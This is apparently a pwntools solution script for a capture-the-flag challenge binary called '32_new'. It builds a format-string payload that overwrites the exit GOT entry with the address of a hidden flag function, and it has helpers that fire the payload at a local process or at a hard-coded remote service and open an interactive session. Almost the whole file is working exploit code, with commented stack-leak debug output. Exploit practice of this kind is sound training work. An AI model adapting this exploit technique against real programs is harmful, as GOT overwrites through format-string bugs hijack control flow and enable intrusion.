from pwn import *
from libformatstr import *
from formatStringExploiter.FormatString import FormatString

elf = ELF('32_new')

#context.log_level = 'DEBUG'


def exec_fmt(pl):
    with process('./32_new') as p:
        p.recvuntil('pwner, whats your name?\n')
        p.sendline(pl)
        p.recvuntil('Till then Bye')
        ret = p.recvall()
        return ret


def attack(pl):
    with process('./32_new') as p:
        p.recvuntil('pwner, whats your name?\n')
        p.sendline(pl)
        p.recvuntil('Till then Bye')
        p.interactive()


def remote_atk(pl):
    with remote('163.172.176.29', 9035) as p:
        p.recvuntil('pwner, whats your name?\n')
        p.sendline(pl)
        p.recvuntil('Till then Bye')
        p.interactive()

    #fmtStr = FormatString(exec_fmt, elf=elf)
    # index = 10
    # pad = 0
    # {'max_explore': 64, 'already_written': 1, 'index': 10, 'arch': 'i386', 'bad_chars': '\n', 'elf': ELF('/media/sd128/sdcard/ctf/backdoor/32_new'), 'leak': pwnlib.memleak.MemLeak(<bound method FormatString._leak of <formatStringExploiter.FormatString.FormatString instance at 0x7f9a4db16bd8>>, search_range=20, reraise=True), 'pad': 0, 'endian': 'little', 'padChar': 'C', 'bits': 32, 'stack': [0, 134514964, 4287639208, 1, 4148418072, 878, 4148127336, 4288161396, 4294223700, 4294281328, 1246382666, 607203621, 1246382704, 134220362, 4148590104, 725871085, 4147803752, 4148010770, 22683471, 4291817104, 4292129648, 878, 4151142496, 0, 4294967295, 4151212128, 4149479868, 4151994464, 0, 0, 6, 4151131424, 4152049433, 0, 4152130256, 4292899208, 4290620128, 4151290523, 134513148, 4293949144, 4151720564, 2, 4152046640, 1, 0, 1, 4152199448, 4151566800, 4151689224, 4151902848, 4151410696, 4294738648, 4151880780, 4151888258, 4151115784, 0, 4152123392, 4152051992, 4292519760, 134513630, 1663069007, 745303919, 1869574944, 1702305902], 'exec_fmt': <function exec_fmt at 0x7f9a50914230>}
    # print vars(fmtStr)


# 0x84a8751
# 0x804870b
flag = elf.symbols['_Z4flagv']
#flag = 0x7be86c5
# 0x61a761a7
print hex(flag)
exit_got = elf.symbols['got.exit']
print hex(exit_got)
printf_plt = elf.symbols['got.printf']
print hex(printf_plt)

#payload = fmtstr_payload(10, {exit_got: flag})
# attack(payload)

payload = FormatString(attack, elf=elf, index=10, explore_stack=False)
payload.write_q(exit_got, flag)
